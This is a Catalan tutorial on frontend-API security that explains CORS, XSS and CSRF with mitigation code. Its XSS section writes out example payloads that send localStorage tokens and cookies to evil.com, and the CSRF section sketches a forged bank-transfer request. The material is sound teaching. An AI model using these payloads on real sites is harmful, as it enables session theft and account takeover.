**¿Quins són els principals riscos de seguretat en connexions frontend-API i com mitigar-los (CORS, XSS, CSRF)?**

###### **CORS Explained** Explicació de MDN sobre l’origen creuat (CORS) i com afecta les peticions web. [https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS) 

**Per què el frontend és vulnerable**

La seguretat de frontend és un aspecte crític del desenvolupament web que sovint queda en segon pla respecte a la seva contrapart de backend. No obstant, ignorar la seguretat de frontend pot deixar les aplicacions web vulnerables a una àmplia gamma d'amenaces, incloent atacs XSS, atacs CSRF, i altres vulnerabilitats de seguretat.

El frontend té un risc inherent: executa codi al navegador de l'usuari, en un entorn que l'atacant pot controlar, modificar i analitzar. Les tres grans vulnerabilitats que afecten les connexions frontend-API son CORS (mal configurat), XSS i CSRF.

**1\. CORS: Cross-Origin Resource Sharing**

### **Quèés i per què existeix**

CORS és un mecanisme basat en capçaleres HTTP que permet a un servidor indicar qualsevol origen (domini, esquema, o port) diferent del seu propi des del qual un navegador hauria de permetre la càrrega de recursos. CORS també es basa en un mecanisme pel qual els navegadors fan una petició de "preflight" al servidor que allotja el recurs cross-origin, per verificar que el servidor permetrà la petició real.

Per motius de seguretat, els navegadors restringeixen les peticions HTTP cross-origin iniciades des de scripts. Fetch i XMLHttpRequest segueixen la política del mateix origen. Això significa que una aplicació web que utilitza aquestes APIs únicament pot demanar recursos del mateix origen des del qual es va carregar l'aplicació, tret que la resposta d'altres orígens inclogui les capçaleres CORS correctes.

| Regla de la política del mateix origen:  Protocol \+ Domini \+ Port han de ser idènticshttps://app.exemple.com       → origenhttps://api.exemple.com       ← ❌ domini diferent → CORShttps://app.exemple.com:3001  ← ❌ port diferent  → CORShttp://app.exemple.com        ← ❌ protocol diferent → CORShttps://app.exemple.com/api   ← ✅ mateixa origen (path diferent, no importa) |
| :---- |

### **El flux de CORS: Preflight**

Per a peticions "no simples" (amb mètodes com PUT, DELETE, o headers personalitzats com `Authorization`), el navegador fa una petició `OPTIONS` prèvia per demanar permís al servidor:

| 1\. Frontend fa: GET /api/usuaris (amb header Authorization)          *↓*2\. Navegador envia PRIMER una petició OPTIONS (preflight):   OPTIONS /api/usuaris   Origin: https://app.exemple.com   Access-Control-Request-Method: GET   Access-Control-Request-Headers: Authorization          *↓*3\. El servidor respon:   Access-Control-Allow-Origin: https://app.exemple.com   Access-Control-Allow-Methods: GET, POST, PUT   Access-Control-Allow-Headers: Authorization, Content-Type          *↓*4\. Si el servidor aprova → el navegador envia la petició real   Si no aprova → el navegador la bloqueja (error CORS) |
| :---- |

### **El risc: CORS mal configurat**

Les misconfiguracions CORS massa permissives poden permetre a atacants enviar peticions cross-origin malicioses i bypasarles proteccions previstes. En CVE-2024-10906, una app Uvicorn permetia `Access-Control-Allow-Origin: *`, exposant tots els endpoints de l'API a possibles atacs CSRF.

| // ❌ MAL: permet qualsevol origen (inclou atacants)"Access-Control-Allow-Origin: \*"// ❌ MAL: \* amb credencials és impossible i insegur"Access-Control-Allow-Origin: \*""Access-Control-Allow-Credentials: true"  // ← el navegador rebutja aquesta combinació// ✅ CORRECTE: llista blanca d'orígens específicsconst origensPermesos \= \[  'https://app.exemple.com',  'https://staging.exemple.com'\];app.use((req, res, next) \=\> {  const origen \= req.headers.origin;  if (origensPermesos.includes(origen)) {    res.setHeader('Access-Control-Allow-Origin', origen);    res.setHeader('Access-Control-Allow-Credentials', 'true');  }  next();}); |
| :---- |

**2\. XSS: Cross-Site Scripting**

### **Què és i com funciona**

Els atacs XSS ocorren quan un atacant aconsegueix injectar scripts maliciosos en pàgines web visualitzades per altres usuaris. L'objectiu principal: robar tokens d'autenticació (JWT, cookies de sessió) per suplantar la identitat de l'usuari.

Tipus principals:

**XSS Reflectit** — el script maliciós ve de la URL i es reflecteix a la resposta. `https://lloc.com/cerca?q=<script>robaTotesLesDades()</script>`

**XSS Emmagatzemat** — el script es guarda a la base de dades i s'executa quan altres usuaris veuen el contingut. Comentaris, noms d'usuari, etc.

**XSS del DOM** — la manipulació del DOM passa purament al client, sense tocar el servidor.

### **Com afecta les connexions a l'API**

| // ❌ Atac XSS que roba el token JWT// L'atacant injecta: \<script\>fetch('https://evil.com?t='+localStorage.getItem('token'))\</script\>// Si l'app guarda el JWT a localStorage → l'atacant el roba immediatament// Prova conceptual de l'atac:// 1\. Atacant posa en un camp de text: \<img src=x onerror="fetch('https://evil.com?t='+document.cookie)"\>// 2\. L'app renderitza: element.innerHTML \= inputUsuari  // ← vulnerable\!// 3\. El navegador executa el script → envia el token a l'atacant |
| :---- |

### 

### 

### **Mitigació del XSS**

| // ❌ MAL: inserció directa de HTML sense sanititzarelement.innerHTML \= dades.contingut;              // ← XSS directedocument.write(inputUsuari);                       // ← XSS directe// ✅ BÉ: usar textContent (escapa automàticament)element.textContent \= dades.contingut;            // ← no interpreta HTML// ✅ BÉ: sanititzar si cal renderitzar HTML (ex: editor de text ric)import DOMPurify from 'dompurify';element.innerHTML \= DOMPurify.sanitize(dades.contingut);// ✅ BÉ: Content Security Policy (CSP) \-- capçalera HTTP del servidor// Bloqueja l'execució de scripts no autoritzats"Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.exemple.com"// ✅ BÉ: Guardar tokens a httpOnly cookies en lloc de localStorage// Les cookies httpOnly NO son accessibles per JavaScript// → els atacs XSS no poden robar el tokenSet-Cookie: token=abc123; HttpOnly; Secure; SameSite=Strict |
| :---- |

**3\. CSRF: Cross-Site Request Forgery**

### **Què és i com funciona**

Quan un usuari invoca operacions crítiques, una petició generada pel navegador ha d'incloure el token CSRF associat. Això és usat per l'aplicació servidor per verificar la legitimitat de la petició de l'usuari. L'aplicació servidor rebutja la petició si el token CSRF no coincideix.

L'atac CSRF explota que el navegador envia automàticament les cookies a tots els dominis que les van establir. L'atacant crea una pàgina que fa peticions al servidor legítim en nom de l'usuari sense que ell ho sàpiga.

| Flux d'un atac CSRF:1\. L'usuari inicia sessió a banc.com → el navegador guarda la cookie de sessió2\. L'usuari visita (sense saber-ho) evil.com3\. evil.com conté:   \<img src="https://banc.com/api/transferencia?dest=atacant\&import=1000"\>   o \<form action="https://banc.com/api/transferencia" method="POST"\>4\. El navegador executa la petició a banc.com incloent la cookie de sessió automàticament\!5\. banc.com creu que l'usuari ha fet la transferència voluntàriament |
| :---- |

### **Diferència CSRF vs XSS**

|  | XSS | CSRF |
| ----- | ----- | ----- |
| **L'atacant** | Injecta codi a l'app legítima | Crea una pàgina externa |
| **Executa codi** | A l'aplicació víctima | Al navegador de l'usuari |
| **Objectiu** | Robar dades, impersonar | Forçar accions no autoritzades |

### **Mitigació del CSRF**

Una defensa fàcil d'usar particularment adequada per a endpoints AJAX o API és l'ús d'una capçalera de petició personalitzada. No es necessita cap token per a aquest enfocament. En aquest patró, el client afegeix una capçalera personalitzada a les peticions que requereixen protecció CSRF.

| // Mitigació 1: SameSite Cookies (la més efectiva avui dia)// El servidor configura les cookies amb SameSite=Strict o LaxSet-Cookie: sessionId=abc123; SameSite=Strict; HttpOnly; Secure// Strict: la cookie NO s'envia mai en peticions cross-site// Lax: s'envia en navegació directa però no en peticions automatitzades// Mitigació 2: CSRF Token (per a formularis tradicionals)// El servidor genera un token únic per sessió// El frontend l'inclou a cada petició de mutacióawait axios.post('/api/transferencia', {  destinatari: 'Anna',  import: 100,  \_csrf: obtenirTokenCSRF()  // ← token del servidor verificat});// Mitigació 3: Capçalera personalitzada per a SPAs amb Axios// Les peticions cross-origin no poden afegir capçaleres personalitzades (CORS ho bloqueja)const apiClient \= axios.create({  headers: {    'X-Requested-With': 'XMLHttpRequest'  // ← no enviable en peticions CSRF simples  }});// Mitigació 4: Verificar l'origen al servidorapp.use((req, res, next) \=\> {  const origen \= req.headers.origin || req.headers.referer;  if (origen && \!origensPermesos.includes(new URL(origen).origin)) {    return res.status(403).json({ error: 'Origen no autoritzat' });  }  next();}); |
| :---- |

**4\. Altres riscos en connexions frontend-API**

**Exposició de secrets al codi frontend:**

| // ❌ MAL: API keys visibles al codi del navegadorconst API\_KEY \= 'sk-prod-abc123secretkey';  // qualsevol pot llegir-la\!const resposta \= await axios.get('/api/dades', {  headers: { 'Authorization': API\_KEY }});// ✅ BÉ: les claus secretes van al backend, mai al frontend// El frontend crida al seu propi backend → el backend crida l'API de tercersconst resposta \= await axios.get('/api/proxy/dades');  // ← el backend té la clau |
| :---- |

**HTTPS obligatori:** Usa sempre HTTPS per xifrar les dades transmeses entre el client i el servidor. Assegura't que els endpoints de l'API i els recursos externs també estiguin protegits amb HTTPS.

| // ✅ Forçar HTTPS a l'Axios instanceconst apiClient \= axios.create({  baseURL: 'https://api.exemple.com',  // ← sempre HTTPS, mai HTTP});// Verificar certificats SSL (Axios ho fa per defecte)// ❌ MAI deshabilitar la verificació SSL:// httpsAgent: new https.Agent({ rejectUnauthorized: false }) |
| :---- |

**Els tres riscos i les seves mitigacions**

| Risc | Quèfa l'atacant | Mitigació principal |
| ----- | ----- | ----- |
| **CORS mal configurat** | Accedeix a l'API des d'un domini maliciós | Llista blanca d'orígens al servidor |
| **XSS** | Injecta scripts que roben tokens | `textContent`, DOMPurify, CSP, HttpOnly cookies |
| **CSRF** | Força accions no autoritzades | SameSite cookies, CSRF tokens, capçaleres personalitzades |
| **Secrets exposats** | Llegeix l'API key al codi del navegador | Mai al frontend, sempre via backend proxy |
| **HTTP (sense S)** | Intercepta el tràfic en xarxes públiques | HTTPS obligatori \+ HSTS |

